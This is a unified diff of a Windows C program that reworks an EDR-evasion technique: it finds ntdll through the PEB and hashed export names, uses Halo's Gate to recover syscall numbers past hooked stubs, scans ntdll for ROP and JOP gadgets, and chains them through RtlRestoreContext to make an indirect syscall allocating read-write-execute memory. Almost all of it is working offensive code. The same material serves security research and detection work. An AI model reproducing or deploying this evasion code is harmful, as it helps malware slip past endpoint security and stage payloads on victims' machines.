@@ -1,23 +1,21 @@
 #include <windows.h>
+#include <psapi.h>
 #include <stdio.h>
-#include <string.h>
 #include <stdint.h>
 #include <stdbool.h>
-#include <psapi.h>
 
-uint64_t fn1va(const char* data);
+#define STUB_SIZE 		24
+#define FULL_STUB_SIZE	32
+#define DWORD_MAX		0xFFFFFFFFUL
+#define FRAMES			2
 
-#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
-typedef NTSTATUS(NTAPI* NtContinue)(PCONTEXT ThreadContext, bool RaiseAlert);
-typedef ULONG (NTAPI *pRtlNtStatusToDosError)(NTSTATUS);
-
-typedef struct _LSA_UNICODE_STRING {
+typedef struct _LSA_UNICODE_STRING{
 	USHORT Length;
 	USHORT MaximumLength;
 	PWSTR  Buffer;
 } LSA_UNICODE_STRING, * PLSA_UNICODE_STRING, UNICODE_STRING, * PUNICODE_STRING, * PUNICODE_STR;
 
-typedef struct _LDR_MODULE {
+typedef struct _LDR_MODULE{
 	LIST_ENTRY              InLoadOrderModuleList;
 	LIST_ENTRY              InMemoryOrderModuleList;
 	LIST_ENTRY              InInitializationOrderModuleList;
@@ -33,7 +31,7 @@ typedef struct _LDR_MODULE {
 	ULONG                   TimeDateStamp;
 } LDR_MODULE, * PLDR_MODULE;
 
-typedef struct _LDR_DATA_TABLE_ENTRY {
+typedef struct _LDR_DATA_TABLE_ENTRY{
     LIST_ENTRY InLoadOrderLinks;
     LIST_ENTRY InMemoryOrderLinks;
     LIST_ENTRY InInitializationOrderLinks;
@@ -52,33 +50,64 @@ typedef struct _LDR_DATA_TABLE_ENTRY {
     PVOID      LoadedImports;
     PVOID      EntryPointActivationContext;
     PVOID      PatchInformation;
-} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;
+} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
 
-typedef struct _PEB_LDR_DATA {
+typedef struct _PEB_LDR_DATA{
 	ULONG                   Length;
 	ULONG                   Initialized;
 	PVOID                   SsHandle;
 	LIST_ENTRY              InLoadOrderModuleList;
 	LIST_ENTRY              InMemoryOrderModuleList;
 	LIST_ENTRY              InInitializationOrderModuleList;
-} PEB_LDR_DATA, * PPEB_LDR_DATA;
+} PEB_LDR_DATA, *PPEB_LDR_DATA;
 
-typedef struct _PEB {
+typedef struct _PEB{
 	BYTE			Reserved[4];
 	VOID*			Reserved2[2];
 	PPEB_LDR_DATA	LoaderData;
 } PEB, * PPEB;
 
+typedef struct GADGETS{
+	DWORD64	ret;
+	DWORD64	jmp_rax;
+	DWORD64	jmp_rcx;
+	DWORD64	add_rsp;
+	DWORD64	pop_rdx_rcx_r8_r9_r10_r11;
+} GADGETS;
 
-#define PATTERN_SIZE	2
-#define STUB_SIZE 		24
-#define FULL_STUB_SIZE	32
-#define DWORD_MAX		0xFFFFFFFFUL
+typedef enum{
+	JOP_SIZE = 2,
+	POP_SIZE = 11,
+	ADD_RSP_SIZE = 8,
+	RET_SIZE = 1,
+} GADGETS_LENGTHS;
 
+// r10 -> rdx -> r8 -> r9  21341
+//	everytime you add an argument to a struct subtract 8 from padding to maintain struct size
 
-DWORD SyscallServiceNumber		= 0;
-PDWORD SyscallAddressJmp		= NULL;
-pRtlNtStatusToDosError LastErr	= NULL;
+typedef struct ROP_FRAME{
+	DWORD64	pop_rdx_rcx_r8_r9_r10_r11;		// 2->1->3->4->1
+	DWORD64	arg2;
+	DWORD64	RCXArg1;	// Set this when calling RestoreContext or SystemFunction032 otherwise set this as SyscallAddressJmp
+	DWORD64	arg3;
+	DWORD64	arg4;
+	DWORD64	R10Arg1;	// Set this in syscall else omit
+	DWORD64	R11;
+	
+	DWORD64	Function;
+	DWORD64	ReturnAddress;
+
+	char	ShadowSpace[32];
+	DWORD64	arg5;
+	DWORD64	arg6;
+	DWORD64	arg7;
+	DWORD64	arg8;
+	DWORD64	arg9;
+	DWORD64	arg10;
+	DWORD64	arg11;
+	DWORD64	arg12;
+	char	padding[116];
+} ROP_FRAME;
 
 uint64_t fn1va(const char* data){
 	uint64_t hash = 0xcbf29ce484222325;
@@ -119,9 +148,9 @@ PBYTE grab_function_pointer(PBYTE Hmodule, uint64_t FunctionHash){
 	PIMAGE_OPTIONAL_HEADER OptionalHeader	= (PIMAGE_OPTIONAL_HEADER)((PBYTE)FileHeader + sizeof(IMAGE_FILE_HEADER));
 	PIMAGE_EXPORT_DIRECTORY ExportDirectory	= (PIMAGE_EXPORT_DIRECTORY)(Hmodule + OptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
 
-	PWORD OrdinalTable		= (PWORD) (Hmodule + ExportDirectory->AddressOfNameOrdinals);
-	PDWORD NameTable		= (PDWORD)(Hmodule + ExportDirectory->AddressOfNames);
-	PDWORD AddressTable		= (PDWORD)(Hmodule + ExportDirectory->AddressOfFunctions);
+	PWORD OrdinalTable	= (PWORD) (Hmodule + ExportDirectory->AddressOfNameOrdinals);
+	PDWORD NameTable	= (PDWORD)(Hmodule + ExportDirectory->AddressOfNames);
+	PDWORD AddressTable	= (PDWORD)(Hmodule + ExportDirectory->AddressOfFunctions);
 
 	for(WORD i = 0; i < ExportDirectory->NumberOfNames; i++){
 		char* Name = (char*)(Hmodule + NameTable[i]);
@@ -132,7 +161,13 @@ PBYTE grab_function_pointer(PBYTE Hmodule, uint64_t FunctionHash){
 	return NULL;
 }
 
-void dynamic_ssn_retrieval(uint64_t FunctionHash, uint64_t CheckSum, PIMAGE_EXPORT_DIRECTORY ExportDirectory, PBYTE PeBase){
+void dynamic_ssn_retrieval(	uint64_t FunctionHash,
+							uint64_t CheckSum,
+							PIMAGE_EXPORT_DIRECTORY ExportDirectory,
+							PBYTE PeBase,
+							DWORD* SyscallServiceNumber,
+							PDWORD* SyscallAddressJmp
+	){
 	PWORD OrdinalTable		= (PWORD)(PeBase + ExportDirectory->AddressOfNameOrdinals);
 	PDWORD NameTable		= (PDWORD)(PeBase + ExportDirectory->AddressOfNames);
 	PDWORD AddressTable		= (PDWORD)(PeBase + ExportDirectory->AddressOfFunctions);
@@ -149,10 +184,10 @@ void dynamic_ssn_retrieval(uint64_t FunctionHash, uint64_t CheckSum, PIMAGE_EXPO
 			memset(CheckTest + 4, 0, 4);
 			printf("[+] Found function with name %s located at 0x%p\n", Name, (void*)(AddressOfName));
 			if(fn1va(CheckTest) == CheckSum){
-				SyscallServiceNumber	= *(PDWORD)((PBYTE)AddressOfName + 4);
-				SyscallAddressJmp		=  (PDWORD)((PBYTE)AddressOfName + 18);
-				printf("[+] Function is not hooked and the SSN is 0x%lx\n", SyscallServiceNumber);
-				printf("[+] Found location of syscall opcode 0x%p\n", (void*)SyscallAddressJmp);
+				*SyscallServiceNumber	= *(PDWORD)((PBYTE)AddressOfName + 4);
+				*SyscallAddressJmp		=  (PDWORD)((PBYTE)AddressOfName + 18);
+				printf("[+] Function is not hooked and the SSN is 0x%lx\n", *SyscallServiceNumber);
+				printf("[+] Found location of syscall opcode 0x%p\n", (void*)(*SyscallAddressJmp));
 				return;
 			}
 			else{
@@ -163,7 +198,8 @@ void dynamic_ssn_retrieval(uint64_t FunctionHash, uint64_t CheckSum, PIMAGE_EXPO
 		}
 	}
 	if(!found){
-		SyscallServiceNumber = DWORD_MAX;
+		*SyscallServiceNumber	= DWORD_MAX;
+		*SyscallAddressJmp		= NULL;
 		return;
 	}
 	PBYTE AddressUp		= NULL;
@@ -174,10 +210,10 @@ void dynamic_ssn_retrieval(uint64_t FunctionHash, uint64_t CheckSum, PIMAGE_EXPO
 		memcpy(CheckTest, AddressUp , STUB_SIZE);
 		memset(CheckTest + 4, 0, 4);
 		if(fn1va(CheckTest) == CheckSum){
-			SyscallServiceNumber	= (*(PDWORD)(AddressUp + 4)) + i;
-			SyscallAddressJmp		= (PDWORD)(AddressUp + 18);
-			printf("[+] Found SSN 0x%lx via Halos Gate with negative delta of %ld\n", SyscallServiceNumber, i);
-			printf("[+] Found location of unhooked syscall opcode 0x%p\n", (void*)SyscallAddressJmp);
+			*SyscallServiceNumber	= (*(PDWORD)(AddressUp + 4)) + i;
+			*SyscallAddressJmp		= (PDWORD)(AddressUp + 18);
+			printf("[+] Found SSN 0x%lx via Halos Gate with negative delta of %ld\n", *SyscallServiceNumber, i);
+			printf("[+] Found location of unhooked syscall opcode 0x%p\n", (void*)(*SyscallAddressJmp));
 			return;
 		}
 		// This is for checking higher SSNs or addresses below the hooked stub
@@ -185,65 +221,88 @@ void dynamic_ssn_retrieval(uint64_t FunctionHash, uint64_t CheckSum, PIMAGE_EXPO
 		memcpy(CheckTest, AddressDown , STUB_SIZE);
 		memset(CheckTest + 4, 0, 4);
 		if(fn1va(CheckTest) == CheckSum){
-			SyscallServiceNumber	= (*(PDWORD)(AddressDown + 4)) - i;
-			SyscallAddressJmp		= (PDWORD)(AddressUp + 18);
-			printf("[+] Found SSN 0x%lx via Halos Gate with positive delta of %ld\n", SyscallServiceNumber, i);
-			printf("[+] Found location of unhooked syscall opcode 0x%p\n", (void*)SyscallAddressJmp);
+			*SyscallServiceNumber	= (*(PDWORD)(AddressDown + 4)) - i;
+			*SyscallAddressJmp		= (PDWORD)(AddressUp + 18);
+			printf("[+] Found SSN 0x%lx via Halos Gate with positive delta of %ld\n", *SyscallServiceNumber, i);
+			printf("[+] Found location of unhooked syscall opcode 0x%p\n", (void*)(*SyscallAddressJmp));
 			return;
 		}
 	}
 	puts("[!] Every function is hooked!");
-	SyscallServiceNumber = DWORD_MAX;
+	*SyscallServiceNumber	= DWORD_MAX;
+	*SyscallAddressJmp		= NULL;
 	return;
 }
 
-PDWORD pattern_scan(const char* pattern, HMODULE PeBase){
+PDWORD pattern_scan(const char* pattern, size_t length, HMODULE PeBase){
 	MODULEINFO ModuleInfo = {0};
 	if(!GetModuleInformation(GetCurrentProcess(), PeBase, &ModuleInfo, sizeof(ModuleInfo))){
 		return NULL;
 	}
-	for(size_t i = 0; i < ModuleInfo.SizeOfImage - PATTERN_SIZE; i += PATTERN_SIZE){
-		if(!memcmp(pattern, (PBYTE)PeBase + i, PATTERN_SIZE)){
+	for(size_t i = 0; i < ModuleInfo.SizeOfImage - length; i++){
+		if(!memcmp(pattern, (PBYTE)PeBase + i, length)){
 			return (PDWORD)((PBYTE)PeBase + i);
 		}
 	}
 	return NULL;
 }
 
-bool AnotherGate(DWORD SyscallServiceNumber, PDWORD SyscallAddressJmp, PDWORD JOPGadget, NtContinue NtCall){
-	CONTEXT ctx = {0};
-	ctx.ContextFlags = CONTEXT_ALL;
-	RtlCaptureContext(&ctx);
-	ctx.Rsp -= 8;
-
-	LARGE_INTEGER interval;
-	interval.QuadPart = -(1e7) * 12;
-
-	printf("[*] Syscall stub for 0x%p\n", (void*)(DWORD64)SyscallAddressJmp);
-
-	ctx.Rip = (DWORD64)JOPGadget;
-	ctx.Rcx = (DWORD64)SyscallAddressJmp;
-	ctx.Rax = (DWORD64)SyscallServiceNumber;
-
-	ctx.R10 = (DWORD64)false;
-	ctx.Rdx = (DWORD64)&interval;
-	ctx.R8	= (DWORD64)0;
-	ctx.R9	= (DWORD64)0;
-	puts("[*] Calling NtContinue");
+bool AnotherGate(	DWORD SyscallServiceNumber,
+					PDWORD SyscallAddressJmp,
+					GADGETS* gadgets,
+					ROP_FRAME* RopChain
+	){
+	static bool Triggered	= false;
+	uint64_t ReturnValue	=  0;
 	
-	NTSTATUS status = NtCall(&ctx, false);
-	if(!NT_SUCCESS(status)){
-		DWORD errorCode = LastErr(status);
-		printf("[-] NtContinue failed: NTSTATUS 0x%08lX → Win32 Error %lu\n", status, errorCode);
-		return -1;
+	CONTEXT SaveCTX 		= {0};
+	CONTEXT RopCTX 			= {0};
+	
+	SaveCTX.ContextFlags	= CONTEXT_ALL;
+	RopCTX.ContextFlags		= CONTEXT_ALL;
+	RtlCaptureContext(&SaveCTX);
+
+	if(Triggered){
+		Triggered = !Triggered;
+		asm volatile ("mov %%rax, %0" : "=r"(ReturnValue));
+		if(!ReturnValue){
+			puts("[+] Successfully proxied syscall through RtlRestoreContext!");
+			return true;
+		}
+		printf("[-] An error in calling the proxied syscall has occured 0x%llX\n", ReturnValue);
+		return false;
 	}
-	RtlRestoreContext(&ctx, NULL);
-	puts("[+] Successfully proxied syscall through NtContinue!");
-	return true;
+	printf("[*] Syscall stub for 0x%p\n", (void*)(ULONG_PTR)SyscallAddressJmp);
+	
+	RtlCaptureContext(&RopCTX);
+	RopCTX.Rip = (DWORD64)gadgets->ret;
+	RopCTX.Rsp = (DWORD64)RopChain;
+	RopCTX.Rax = (DWORD64)SyscallServiceNumber;
+	for(int i = 0; i < FRAMES; i++){
+		RopChain[i].pop_rdx_rcx_r8_r9_r10_r11 = (DWORD64)gadgets->pop_rdx_rcx_r8_r9_r10_r11;
+		RopChain[i].ReturnAddress = (DWORD64)gadgets->add_rsp;
+	}
+	RopChain[0].Function	= (DWORD64)gadgets->jmp_rcx;
+	RopChain[0].RCXArg1		= (DWORD64)SyscallAddressJmp;
+	
+	RopChain[FRAMES-1].RCXArg1	= (DWORD64)&SaveCTX;
+	RopChain[FRAMES-1].Function	= (DWORD64)RtlRestoreContext;
+	Triggered = !Triggered;
+	puts("[*] Calling RtlRestoreContext");
+	RtlRestoreContext(&RopCTX, NULL);
+	return false;
 }
 
 int main(void){
-	const char JOPGadget[PATTERN_SIZE]	= { '\xff', '\xe1' };			 // jmp rcx		{'\x49', '\xff', '\xe2'};	// jmp r10
+	DWORD SyscallServiceNumber		= 0;
+	PDWORD SyscallAddressJmp		= NULL;
+	
+	const char ret_g[RET_SIZE]						= { '\xc3' };					  // ret
+	const char jmp_rcx_g[JOP_SIZE]					= { '\xff', '\xe1' };			 // jmp rcx
+	const char jmp_rax_g[JOP_SIZE]					= { '\xff', '\xe0' };			// jmp rax
+	const char pop_rdx_rcx_r8_r9_r10_r11_g[POP_SIZE]= { '\x5a', '\x59','\x41', '\x58', '\x41', '\x59', '\x41', '\x5a', '\x41', '\x5b', '\xc3' }; // pop r8; pop r9; pop r10; pop r11; ret
+	const char add_rsp_216_g[ADD_RSP_SIZE]			= { '\x48', '\x81', '\xc4', '\xd8', '\x00', '\x00', '\x00', '\xc3' };	// add rsp, 0xD ; ret
+	
 	const char SyscallStub[STUB_SIZE]	= {	'\x4c', '\x8b', '\xd1', 
 											'\xb8', '\x00', '\x00', '\x00', '\x00', 
 											'\xf6', '\x04', '\x25', '\x08', '\x03', '\xfe', '\x7f', '\x01', 
@@ -252,72 +311,101 @@ int main(void){
 											'\xc3', 
 											'\xcd', '\x2e', 
 											'\xc3'
-	};
+										};
 	const char NameNtDll[]					= {'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', '\x00'};
-	const char NameMsvcrt[]					= {'m', 's', 'v', 'c', 'r', 't', '.', 'd', 'l', 'l', '\x00'};
-
-	const char NtContinueName[]				= {'N', 't', 'C', 'o', 'n', 't', 'i', 'n', 'u', 'e', '\x00'};
-	const char RtlNtStatusToDosErrorName[]	= {'R', 't', 'l', 'N', 't', 'S', 't', 'a', 't', 'u', 's', 'T', 'o', 'D', 'o', 's', 'E', 'r', 'r', 'o', 'r', '\x00'};
-	
-	const char NtDelayExecutionName[]		= {'N', 't', 'D', 'e', 'l', 'a', 'y', 'E', 'x', 'e', 'c', 'u', 't', 'i', 'o', 'n', '\x00'};
+	const char NtVirtualAllocate[]			= {'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', '\x00'};
 	uint64_t CheckSum						= fn1va(SyscallStub);
-
 	PBYTE NtdllBaseAddress					= grab_dll_ptr(fn1va(NameNtDll));
+	
+	GADGETS GadgetArray			= {0};
+	ROP_FRAME RopChain[FRAMES]	= {0};
+	
 	if(!NtdllBaseAddress){
 		puts("[-] Failed to Resolve PEB or base address of ntdll.dll");
 		return -1;
-	}
-	else{
+	}else{
 		printf("[+] Found ntdll.dll base address located at 0x%p\n", (PVOID)NtdllBaseAddress);
 	}
-	LastErr = (pRtlNtStatusToDosError)(uintptr_t)(grab_function_pointer(NtdllBaseAddress, fn1va(RtlNtStatusToDosErrorName)));
-	if(!LastErr){
-		puts("[-] Unable to resolve RtlNtStatusToDosError!");
-		return -1;
-	}
-	else{
-		printf("[+] Found RtlNtStatusToDosError located at %p\n", (void*)(uintptr_t)LastErr);
-	}
-	NtContinue NtCall = (NtContinue)(uintptr_t)(grab_function_pointer(NtdllBaseAddress, fn1va(NtContinueName)));
-	if(!NtCall){
-		puts("[-] Failed to resolve NtContinue!");
-		return -1;
-	}
-	else{
-		printf("[+] Resolved NtContinue located at address 0x%p\n", (void*)(uintptr_t)NtCall);
-	}
-	PBYTE MsvcrtBase = grab_dll_ptr(fn1va(NameMsvcrt));
-	if(!MsvcrtBase){
-		puts("[-] Unable to locate msvcrt.dll");
-		return -1;
-	}
-	else{
-		printf("[+] msvcrt.dll found at 0x%p\n", (void*)MsvcrtBase);
-	}
-	
+
 	PIMAGE_DOS_HEADER DosHeader				= (PIMAGE_DOS_HEADER)NtdllBaseAddress;
 	PIMAGE_NT_HEADERS NtHeader				= (PIMAGE_NT_HEADERS)(NtdllBaseAddress + DosHeader->e_lfanew);
 	PIMAGE_FILE_HEADER FileHeader			= (PIMAGE_FILE_HEADER)(&NtHeader->FileHeader);
 	PIMAGE_OPTIONAL_HEADER OptionalHeader	= (PIMAGE_OPTIONAL_HEADER)((PBYTE)FileHeader + sizeof(IMAGE_FILE_HEADER));
 	PIMAGE_EXPORT_DIRECTORY ExportDirectory	= (PIMAGE_EXPORT_DIRECTORY)(NtdllBaseAddress + OptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
 
-	//pattern_scan(JOPGadget, (HMODULE)MsvcrtBase)
-	PDWORD Jop = pattern_scan(JOPGadget, (HMODULE)NtdllBaseAddress);
-	if(!Jop){
-		puts("[-] Unable to locate JOP Gadgets!!");
+	GadgetArray.jmp_rcx 					= (DWORD64)pattern_scan(jmp_rcx_g, JOP_SIZE, (HMODULE)NtdllBaseAddress);
+	GadgetArray.jmp_rax 					= (DWORD64)pattern_scan(jmp_rax_g, JOP_SIZE, (HMODULE)NtdllBaseAddress);
+	GadgetArray.add_rsp 					= (DWORD64)pattern_scan(add_rsp_216_g, ADD_RSP_SIZE, (HMODULE)NtdllBaseAddress);
+	GadgetArray.ret							= (DWORD64)pattern_scan(ret_g, RET_SIZE, (HMODULE)NtdllBaseAddress);
+	GadgetArray.pop_rdx_rcx_r8_r9_r10_r11	= (DWORD64)pattern_scan(pop_rdx_rcx_r8_r9_r10_r11_g, POP_SIZE, (HMODULE)NtdllBaseAddress);
+	if(!GadgetArray.jmp_rcx){
+		puts("[-] Unable to locate jmp_rcx Gadgets!!");
 		return -1;
 	}
 	else{
-		printf("[+] JOP Gadget located at 0x%p\n", (void*)Jop);
+		printf("[+] jmp_rcx Gadget located at 0x%p\n", (void*)GadgetArray.jmp_rcx);
 	}
-	//NtDelayExecutionName		-->		NtCreateFile
-	dynamic_ssn_retrieval(fn1va(NtDelayExecutionName), CheckSum, ExportDirectory, NtdllBaseAddress);
-	if(SyscallServiceNumber == DWORD_MAX || SyscallAddressJmp == NULL){
+	
+	if(!GadgetArray.jmp_rax){
+		puts("[-] Unable to locate jmp_rax Gadgets!!");
+		return -1;
+	}
+	else{
+		printf("[+] jmp_rax Gadget located at 0x%p\n", (void*)GadgetArray.jmp_rax);
+	}
+	
+	if(!GadgetArray.pop_rdx_rcx_r8_r9_r10_r11){
+		puts("[-] Unable to locate pop_rdx_rcx_r8_r9_r10_r11 Gadgets");
+		return -1;
+	}
+	else{
+		printf("[+] pop_rdx_rcx_r8_r9_r10_r11 located at 0x%p\n", (void*)GadgetArray.pop_rdx_rcx_r8_r9_r10_r11);
+	}
+	
+	if(!GadgetArray.add_rsp){
+		puts("[-] Unable to locate add_rsp_216 Gadgets");
+		return -1;
+	}
+	else{
+		printf("[+] add_rsp_216 Gadget located at 0x%p\n", (void*)GadgetArray.add_rsp);
+	}
+
+	if(!GadgetArray.ret){
+		puts("[-] Unable to locate ret gadget");
+		return -1;
+	}
+	else{
+		printf("[+] ret Gadget located at 0x%p\n", (void*)GadgetArray.ret);
+	}
+	dynamic_ssn_retrieval(	fn1va(NtVirtualAllocate), 
+							CheckSum, 
+							ExportDirectory, 
+							NtdllBaseAddress, 
+							&SyscallServiceNumber, 
+							&SyscallAddressJmp
+						);
+
+	if(	SyscallServiceNumber == DWORD_MAX || 
+		SyscallAddressJmp == NULL
+	){
 		puts("[-] Failed to retrieve SSN");
 		return -1;
 	}
-	AnotherGate(SyscallServiceNumber, SyscallAddressJmp, Jop, NtCall);
+	DWORD64	arg4		= 0x1000;
+	PVOID	arg2		= NULL;
+	RopChain[0].R10Arg1 = (DWORD64)GetCurrentProcess();
+	RopChain[0].arg2	= (DWORD64)&arg2;
+	RopChain[0].arg3	= (DWORD64)0;
+	RopChain[0].arg4	= (DWORD64)&arg4;
+	RopChain[0].arg5	= (DWORD64)MEM_COMMIT | MEM_RESERVE;
+	RopChain[0].arg6	= (DWORD64)PAGE_EXECUTE_READWRITE;
 	
+	if(AnotherGate(SyscallServiceNumber, SyscallAddressJmp, &GadgetArray, RopChain)){
+		puts("[+] Good job this implementation actually works!!!");
+	}
+	else{
+		puts("[-] This is going to be a bad time for you....");
+	}
 	return 0;
 }
-// gcc src\main.c src\util.c -pedantic -Wall -Werror -o sol
+/* gcc main.c -pedantic -Wall -Werror -o sol */
